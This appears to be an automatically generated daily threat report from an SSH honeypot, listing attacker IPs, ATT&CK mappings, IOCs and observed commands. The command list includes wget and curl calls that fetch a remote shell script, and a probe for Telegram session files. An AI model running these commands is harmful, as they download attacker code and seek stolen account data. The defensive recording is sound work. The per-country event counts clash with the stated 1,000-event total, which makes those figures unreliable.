# Threat Intelligence Report

**Generated**: 2026-04-21 09:49 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **1,000 events** from **553 unique source IPs** across **32 countries** and **47 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 1,000 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 553 |
| Atomic Attack Patterns | 1005 |
| MITRE ATT&CK Techniques | 6 |
| Generated Sigma Rules | 4 |
| Generated YARA Rules | 3 |
| Generated Suricata Rules | 5 |
| Blocked IPs (Firewall) | 499 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1082 (System Information Discovery) | | 993 |
| T1005 (Data from Local System) | | 2 |
| T1059.004 (Unix Shell) | | 2 |
| T1105 (Ingress Tool Transfer) | | 2 |
| T1016 (System Network Configuration Discovery) | | 1 |
| T1057 (Process Discovery) | | 1 |

### Tactics Distribution

- **discovery**: 995 events ████████████████████████████████████████
- **collection**: 2 events █
- **execution**: 2 events █
- **command_and_control**: 2 events █

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 17,963 |
| Germany | 5,812 |
| France | 4,861 |
| Mexico | 3,570 |
| Netherlands | 2,294 |
| Poland | 2,274 |
| Australia | 1,914 |
| India | 1,418 |
| United Kingdom | 1,027 |
| Bulgaria | 896 |
| Russia | 767 |
| Pakistan | 414 |
| Singapore | 378 |
| China | 317 |
| South Korea | 299 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| ReliableSite.Net LLC | 12,778 |
| DigitalOcean, LLC | 7,634 |
| Sierra Madre Internet SA de CV | 3,448 |
| OVH SAS | 2,631 |
| ISAEV Igor | 2,241 |
| Hydra Communications Ltd | 1,875 |
| Modat B.V. | 1,714 |
| Pfcloud UG (haftungsbeschrankt) | 1,450 |
| Amazon.com, Inc. | 1,130 |
| ONYPHE SAS | 1,006 |
| Google LLC | 837 |
| ColocaTel Inc. | 829 |
| Alibaba US Technology Co., Ltd. | 756 |
| Tube-Hosting | 720 |
| Censys, Inc. | 673 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `104.243.32.126` | 3,775 | Attacker |
| `177.125.137.18` | 3,448 | Attacker |
| `104.243.35.94` | 2,737 | Attacker |
| `51.68.207.118` | 2,628 | Attacker |
| `87.251.64.159` | 2,231 | Attacker |
| `104.243.32.235` | 1,823 | Attacker |
| `45.156.87.99` | 1,370 | Attacker |
| `165.227.156.190` | 1,266 | Attacker |
| `209.38.95.158` | 1,266 | Attacker |
| `64.227.186.247` | 1,263 | Attacker |
| `68.183.77.93` | 1,263 | Attacker |
| `167.172.175.156` | 1,260 | Attacker |
| `104.243.35.92` | 1,107 | Attacker |
| `104.243.43.7` | 1,081 | Attacker |
| `104.243.34.165` | 961 | Attacker |
| `206.221.176.60` | 933 | Attacker |
| `85.11.167.11` | 793 | Attacker |
| `185.91.127.85` | 720 | Attacker |
| `170.64.177.137` | 643 | Attacker |
| `176.120.22.6` | 497 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 553 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 5 |

### Targeted File Paths

- `/.local/share/TelegramDesktop/tdata`
- `/etc/smsd.conf`
- `/var/log/smsd.log`
- `/var/qmux_connect`
- `/var/spool/sms`

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [444x] `uname -m`
- [436x] `uname -s -v -n -r -m`
- [56x] `uname -a`
- [55x] `/bin/./uname -s -v -n -r -m`
- [2x] `grep '[Mm]iner`
- [1x] `ifconfig`
- [1x] `cat /proc/cpuinfo`
- [1x] `ps -ef`
- [1x] `ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* `
- [1x] `locate D877F783D5D3EF8Cs`
- [1x] `echo Hi`
- [1x] `cat -n`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 4 | `sigma/*.yml` |
| YARA (Payload) | 3 | `yara/*.yar` |
| Suricata (IDS/IPS) | 5 | `suricata/honeypot.rules` |
| Firewall (iptables) | 499 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*